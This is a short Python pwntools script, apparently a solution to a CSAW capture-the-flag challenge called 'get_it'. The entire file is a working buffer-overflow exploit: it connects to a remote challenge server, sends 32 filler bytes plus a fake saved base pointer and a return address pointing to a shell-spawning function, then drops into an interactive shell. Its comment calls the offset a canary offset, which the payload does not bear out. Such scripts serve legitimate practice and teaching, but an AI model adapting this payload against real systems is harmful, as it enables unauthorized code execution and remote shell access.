from pwn import *
from binascii import *


def get_flag():
    context.arch = "amd64"
    local = False
    if local:
        c = process("./get_it")
        context.terminal = 'sh'
        gdb.attach(c, 'break gets')
    else:
        c = remote("pwn.chal.csaw.io", 9001)
    # recv prompt
    o = c.recvline()
    print("Received: ", o)
    # calculate offset between buffer and canary
    dist_to_rbp = 0x20
    give_shell_add = 0x4005b6
    pay_load = b"A" * (dist_to_rbp) + pack(0xDEADBEEF) + pack(give_shell_add)
    print(pay_load)
    c.sendline(pay_load)
    c.interactive()


if __name__ == "__main__":
    get_flag()
